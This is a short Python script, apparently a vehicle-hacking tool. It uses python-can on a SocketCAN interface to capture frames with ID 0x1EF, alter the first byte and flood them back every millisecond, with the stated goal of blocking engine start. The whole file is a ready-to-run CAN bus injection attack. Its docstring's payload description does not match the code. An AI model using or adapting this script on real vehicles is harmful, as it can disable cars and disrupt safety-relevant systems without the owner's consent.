"""
Goal: block eng start
How to: run python3 car_filter.py
Doc: the code "blo ck" eng by send id 1EF with data AAAAAAAAAAAAAAAA on freq 0.001s
"""

import can
import time
import argparse

def arguments_declaration():
    parser = argparse.ArgumentParser(description='Goal: block eng start\n'
                                                 'How to: run python3 car_filter.py\n'
                                                 'Implemantation: the code "block" eng by send id 1EF with data AAAAAAAAAAAAAAAA on freq 0.001s')
    arg = parser.parse_args()
def runner():
    # arguments_declaration()

    can.rc['interface'] = 'socketcan_native'
    ecuId = 0x1EF
    can_filters = []
    can_filters.append({"can_id": ecuId, "can_mask": 0x7FF})
    bus = can.interface.Bus('can0', can_filters=can_filters)
    # msg = can.Message(arbitration_id=ecuId, data=[0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00], extended_id=False)
    # msg = can.Message(arbitration_id=ecuId, data=[0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF], extended_id=False)
    # msg = can.Message(arbitration_id=ecuId, data=[0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA], extended_id=False)

    while True:
        res_curr_msg = bus.recv()
        data = res_curr_msg.data
        # print(data)
        data[0] = 0x42
        msg = can.Message(arbitration_id=ecuId, data=data, extended_id=False)
        # print(msg)
        bus.send(msg)
        time.sleep(0.001)
        # print("in loop")
if __name__ == '__main__':
    runner()